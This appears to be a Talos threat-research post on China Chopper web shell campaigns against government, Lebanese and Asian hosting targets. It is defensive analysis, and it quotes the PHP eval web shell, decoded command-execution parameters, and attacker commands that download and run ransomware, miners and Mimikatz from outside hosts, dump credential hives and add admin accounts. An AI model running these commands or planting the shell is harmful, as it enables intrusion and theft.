But China Chopper has found a way to stay relevant, active and\n[effective nine years after its initial discovery. China Chopper is a web shell that allows attackers to retain access to an infected system using a client side](https://attack.mitre.org/software/S0020/)\napplication which contains all the logic required to control the target. Several threat groups have used China Chopper, and over the past two years, we've seen\nseveral different campaigns utilizing this web shell and we chose to document three most active campaigns in this blog post.\n\nWe decided to take a closer look at China Chopper after security firm Cybereason reported on a massive attack against telecommunications providers called\n[\"Operation Soft Cell,\" which reportedly utilized China Chopper. Cisco Talos discovered significant China Chopper activity over a two-year period beginning in](https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers)\nJune 2017, which shows that even nine years after its creation, attackers are using China Chopper without significant modifications.\n\nThis web shell is widely available, so almost any threat actor can use. This also means it's nearly impossible to attribute attacks to a particular group using only\npresence of China Chopper as an indicator.\n\nThe usage of China Chopper in recent campaigns proves that a lot of old threats never really die, and defenders on the internet need to be looking out for\nmalware both young and old.\n\n### What is China Chopper?\n\nChina Chopper is a tool that allows attackers to remotely control the target system that needs to be running a web server application before it can be targeted\nby the tool. The web shell works on different platforms, but in this case, we focused only on compromised Windows hosts. China Chopper is a tool that has\n[been used by some state-sponsored actors such as Leviathan and Threat Group-3390, but during our investigation we've seen actors with varying skill levels.](https://attack.mitre.org/groups/G0065/)\n\nIn our research, we discovered both Internet Information Services (IIS) and Apache web servers compromised with China Chopper web shells. We do not have\nadditional data about how the web shell was installed, but there are several web application frameworks such as older versions of Oracle WebLogic or\nWordPress that may have been targeted with known remote code execution or file inclusion exploits.\n\nChina Chopper provides the actor with a simple GUI that allows them to configure servers to connect to and generate server-side code that must be added to\nthe targeted website code in order to communicate.\n\n_China Chopper GUI_\n\n\n-----\n\nThe server-side code is extremely simple and contains, depending on the application platform, just a single line of code. The backdoor supports .NET Active\nServer Pages or PHP.\n\nHere is an example of a server-side code for a compromised PHP application:\n\n<?php @eval($_POST['test']);?>\n\nWe cannot be sure if the simplicity of the server code was a deliberate decision on the part of the China Chopper developers to make detection more difficult,\nbut using pattern matching on such as short snippet may produce some false positive detections.\n\nThe China Chopper client communicates with affected servers using HTTP POST requests. The only function of the server-side code is to evaluate the request\nparameter specified during the configuration of the server code in the client GUI. In our example, the expected parameter name is \"test.\" The communication\nover HTTP can be easily spotted in the network packet captures.\n\nChina Chopper contains a remote shell (Virtual Terminal) function that has a first suggested command of 'netstat an|find \"ESTABLISHED.\"' and it is very likely\nthat this command will be seen in process creation logs on affected systems.\n\n_China Chopper's first suggested Terminal command_\n\nWhen we analyze the packet capture, we can see that the parameter \"test\" contains another eval statement.\n\nDepending on the command, the client will submit a certain number of parameters, z0 to zn. All parameters are encoded with a standard base64 encoder\nbefore submission. Parameter z0 always contains the code to parse other parameters, launch requested commands and return the results to the client.\n\ntest=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW5\n\nEncoded China Chopper POST request with parameters\n\nIn this request, the decoded parameters are:\n\nz0 - @ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo(\">|\");;$p=base64_decode($_POST[\"z1\"]);$s=base64_decode($_POST[\"z2\"]);$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"\n{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";@system($r.\" 2>&1\",$ret);print ($ret!=0)?\"\nret={$ret}\n\":\"\";;echo(\"|<-\");die();\n\nz1 - cmd\n\nz2 - cd /d \"C:\\xampp\\htdocs\\dashboard\\\"&netstat -an | find \"ESTABLISHED\"&echo [S]&cd&echo [E]\n\nThe end of the command \"&echo [S]&cd&echo [E]\" seems to be present in all virtual terminal requests and may be used as a reliable indicator to detect China\nChopper activity in packet captures or behavioral logs.\n\nApart from the terminal, China Chopper includes a file manager (with the ability to create directories, download files and change file metadata), a database\nmanager and a rudimentary vulnerability scanner.\n\nWhat follows is our view into three different compromises, each with different goals, tools, techniques and likely different actors.\n\n\n-----\n\n_Timeline of the observed case studies_\n\n### Case study No. 1: Espionage context\n\nWe identified the usage of China Chopper in a couple of espionage campaigns. Here, we investigate a campaign targeting an Asian government organization.\nIn this campaign, China Chopper was used in the internal network, installed on a few web servers used to store potentially confidential documents.\n\nThe purpose of the attacker was to obtain documents and database copies. The documents were automatically compressed using WinRAR:\n\ncd /d C:\\Windows\\Working_Directory\\\nrenamed_winrar a -m3 -hp19_Characters_Complex_Password -ta[date] -n*.odt -n*.doc -n*.docx -n*.pdf -n*.xls -n*.xlsx -n*.ppt -n*.pptx -r\nc:\\output_directory\\files.rar c:\\directory_to_scan\\\n\nThis command is used to create an archive containing documents modified after the date put as an argument. The archives are protected with a strong\npassword containing uppercase, lowercase and special characters. The passwords were longer than 15 characters.\n\nWe assume the attacker ran this command periodically in order to get only new documents and minimize the quantity of exfiltrated data.\n\nOn the same target, we identified additional commands executed with China Chopper using WinRAR:\n\nrar a -inul -ed -r -m3 -taDate -hp<profanity> ~ID.tmp c:\\directory_to_scan\n\nChina Chopper is a public hacking tool and we cannot tell if in this case the attacker is the same actor as before. But the rar command line here is sufficiently\ndifferent to note that it could be a different actor. The actor used an offensive phrase for a password, which is why we've censored it here.\n\nThe attacker deployed additional tools to execute commands on the system:\n\nC:\\windows\\Microsoft.NET\\Framework\\v2.0.50727\\MSBuild.exe C:\\windows\\temp\\Document.csproj /p:AssemblyName=C:\\windows\\temp\\downloader.png\n/p:ScriptFile=C:\\windows\\temp\\downloader.dat /p:Key=27_characters_key > random.tmp\n\nMSBuild.exe is used to compile and execute a .NET application with two arguments: the ScriptFile argument contains a PowerShell script encrypted with the\nvalue of the key argument. Here is the .NET code:\n\n_.NET loader code_\n\nThe .NET loader supports encrypted files or URLs as the script argument. If the operator uses an HTTP request, the loader downloads the payload with one of\nthe hardcoded User-Agents. The loader decrypts the downloaded file and executes it:\n\n\n-----\n\nRun-MySQLQuery -ConnectionString 'Server=localhost;Uid=root;Pwd=;database=DBName;\nConvert Zero Datetime=True' -Query 'Select * from table where UID > 'Value' -Dump\n\nThe \"where UID\" condition in the SQL query has the same purpose as the date in the previous WinRAR command. We assume the attacker performs the\nquery periodically and does not want to dump the entire database, but only the new entries. It is interesting to see that after dumping the data, the attacker\nchecks if the generated file is available and if it contains any data:\n\ndir /O:D c:\\working_directory\\db.csv\npowershell -nop -exec bypass Get-Content \"c:\\working_directory\\db.csv\" | Select-Object -First 10\n\nHow are the file archives and the database dumps exfiltrated? Since the targeted server is in an internal network, the attacker simply maps a local drive and\ncopies the file to it.\n\ncd /d C:\\working_directory\\\nnet use \\192.168.0.10\\ipc$ /user:USER PASSWORD\nmove c:\\working_directory\\db.csv \\192.168.0.10\\destination_directory\n\nThe attacker must have access to the remote system in order to exfiltrate data. We already saw the usage of a HTTP tunnel tool to create a network tunnel\nbetween the infected system and a C2 server.\n\n### Case No. 2: Multi-purpose campaign\n\nWe observed another campaign targeting an organisation located in Lebanon. While our first case describes a targeted campaign with the goal to exfiltrate\ndata affecting internal servers, this one is the opposite: an auxiliary public web site compromised by several attackers for different purposes.\n\nWe identified actors trying to deploy ransomware on the vulnerable server using China Chopper. The first attempt was Sodinokibi ransomware:\n\ncertutil.exe -urlcache -split -f hxxp://188.166.74[.]218/radm.exe C:\\Users\\UserA\\AppData\\Local\\Temp\\radm.exe\n\n[The second delivered the Gandcrab ransomware:](https://blog.talosintelligence.com/2018/05/gandcrab-compromised-sites.html)\n\nIf($ENV:PROCESSOR_ARCHITECTURE -contains 'AMD64'){\nStart-Process -FilePath \"$Env:WINDIR\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\" -argument \"IEX ((new-object\nnet.webclient).downloadstring('https://pastebin.com/raw/Hd7BmJ33'));\nInvoke-ACAXGZFTTDUDKY;\nStart-Sleep -s 1000000;\"\n} else {\nIEX ((new-object net.webclient).downloadstring('https://pastebin.com/raw/Hd7BmJ33'));\nInvoke-ACAXGZFTTDUDKY;\nStart-Sleep -s 1000000;\n}\n\nHere is the script hosted on Pastebin:\n\n_Reflective loader downloaded from pastebin.com_\n\nThe script executes a hardcoded PE file located — Gandcrab —at the end of the script using a reflective DLL-loading technique.\n\nIn addition to the ransomware, we identified another actor trying to execute a Monero miner on the vulnerable server with China Chopper:\n\nPowershell -Command -windowstyle hidden -nop -enc -iex(New-Object\nNet.WebClient).DownloadString('hxxp://78.155.201[.]168:8667/6HqJB0SPQqbFbHJD/init.ps1')\n\nHere's a look at the miner configuration:\n\n\n-----\n\n_Monero miner configuration_\n\nSome of the detected activity may have been manual and performed in order to get OS credentials.\n\nTrying to get the registry:\n\nreg save hklm\\sam sam.hive\nreg save hklm\\system system.hive\nreg save hklm\\security security.hive\n\nUsing Mimikatz (with a few hiccups along the way):\n\npowershell IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');\nInvoke-Mimikatz >>c:\\1.txt\n\npowershell IEX\",\"(New-Object\",\"Net.WebClient).DownloadString('hxxp://is[.]gd/oeoFuI'); Invoke-Mimikatz -DumpCreds\n\nC:\\Windows\\System32WindowsPowerShell\\v1.0\\powershell.exe IEX\n\n(New-Object\",\"Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/InvokeMimikatz.ps1');\nInvoke-Mimikatz\n\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe [Environment]::Is64BitProcess\n\npowershell.exe IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');\nInvoke-Mimikatz >>c:\\1.txt\n\nAttempting to dump password hashes using a PowerShell module and the command line:\n\nIEX (New-Object\n\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/klionsec/CommonTools/master/Get-PassHashes.ps1');Get-PassHashes;\n\nThe attackers also tried procdump64.exe on lsass.exe to get the local credentials stored in memory. In addition to the multiple attempts to dump the credential,\nthe attackers had to deal with typos: missed spaces, wrong commands or letters switching.\n\nOne of the actors successfully acquired the credentials and tried to pivot internally by using the credentials and the \"net use\" commands.\n\n[Finally, several remote access tools such as Gh0stRAT and Venom multi-hop proxy were deployed on the machine, as well as a remote shell written purely in](https://blog.talosintelligence.com/2019/06/threat-roundup-0607-0614.html)\nPowerShell.\n\n### Case No. 3: Web hosting providers compromised\n\nIn one campaign, we discovered an Asian web-hosting provider under attack, with the most significant compromise spanning several Windows servers over a\nperiod of 10 months. Once again, we cannot be sure if this was a single actor or multiple groups, since the activities differ depending on the attacked server.\nWe show just a subset of observed activities\n\n\n-----\n\ncd /d C:\\compromisedappdirectory&net localgroup administrattors user /add\n\nNotice the misspelling of the word \"administrators.\" The actor realizes that the addition of the user was not successful and attempts a different technique. They\n[download and install an archive containing executables and trivially modified source code of the password-stealing tool \"Mimikatz Lite\" as GetPassword.exe.](https://github.com/infosecsmith/MimikatzLite)\n\nThe tool investigates the Local Security Authority Subsystem memory space in order to find, decrypt and display retrieved passwords. The only change,\ncompared with the original tool is that actors change the color and the code page of the command window. The color is changed so that green text is displayed\non a black background and the active console code page is changed to the Chinese code page 936.\n\nFinally, the actor attempts to dump the database of a popular mobile game \"Clash of Kings,\" possibly hosted on a private server.\n\n#### Server 2\n\nAn actor successfully tested China Chopper on a second server and stopped the activity. However, we also found another Monero cryptocurrency miner just as\nwe found commodity malware on other systems compromised with China Chopper.\n\nThe actors first reset the Access Control List for the Windows temporary files folder and take ownership of the folder. They then allow the miner executable\nthrough the Windows Firewall and finally launch the mining payload.\n\nC:\\Windows\\system32\\icacls.exe C:\\Windows\\Temp /Reset /T\nC:\\Windows\\system32\\takeown.exe /F C:\\Windows\\Temp\nC:\\Windows\\system32\\netsh.exe Firewall Add AllowedProgram C:\\Windows\\Temp\\lsass.eXe Windows Update Enable\nC:\\Windows\\Temp\\lsass.eXe\n\n#### Server 3\n\nThe attack on this server starts by downloading a number of public and private tools, though we were not able to retrieve them.\n\n[The actor attempts to exploit CVE-2018–8440 — an elevation of privilege vulnerability in Windows when it improperly handles calls to Advanced Local](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8440)\n[Procedure Call — to elevate the privileges using a modified proof-of-concept exploit.](https://github.com/GossiTheDog/zeroday)\n\ncd /d C:\\directoryofcompromisedapp&rundll32 C:\\directoryofcompromisedapp\\ALPC-TaskSched-LPE.dll,a\n\nThe attacker launches several custom tools and an available tool that attempts to create a new user iis_uses and change DACLs to allow the users to modify\ncertain operating system objects.\n\nThe attacker obtains the required privileges and launches a few other tools to modify the access control lists (ACLs) of all websites running on the affected\nserver. This is likely done to compromise other sites or to run a web defacement campaign.\n\ncacls \\. C:\\path_to_a_website /T /E /C /G Everyone:F\n\nFinally, the actor attempts to launch Powershell Mimikatz loader to get more credentials from memory and save the credentials into a text file:\n\npowershell -nop -exec bypass -c IEX (New-Object\nNet.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1');InvokeMimikatz|Out-File\n-Encoding ASCII outputfile.txt\n\n#### Server 4\n\nThe China Chopper actor activity starts with the download and execution of two exploit files which attempt to exploit the Windows vulnerabilities CVE-2015[0062, CVE-2015-1701 and CVE-2016-0099 to allow the attacker to modify other objects on the server.](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2015-1701)\n\nOnce the privilege escalation was successful, the actor adds a new user account and adds the account to the administrative group.\n\nnet user admin admin /ad\nnet localgroup administrators admin /ad\n\nThe attacker next logs on to the server with a newly created user account and launches a free tool replacestudio32.exe, a GUI utility that easily searches\nthrough text-based files and performs replacement with another string. Once again, this could be used to affect all sites hosted on the server or simply deface\npages.\n\n### Conclusion\n\nInsecure web applications provide an effective entry point for attackers and allow them to install additional tools such as web shells, conduct reconnaissance\nand pivot to other systems.\n\nAlthough China Chopper is an old tool, we still see it being used by attackers with various goals and skill levels and in this post we showed some of the\ncommon tools, techniques and processes employed in three separate breaches. Because it is so easy to use, it's impossible to confidently connect it to any\nparticular actor or group.\n\nIn our research we documented three separate campaigns active over a period of several months. This corroborates the claim that an average time to detect\n\n\n-----\n\np g, pp y, y g g\n\n## Coverage\n\n[Intrusion prevention systems such as SNORT® provide an effective tool to detect China Chopper activity due to specific signatures present at the end of each](https://snort.org/)\ncommand.
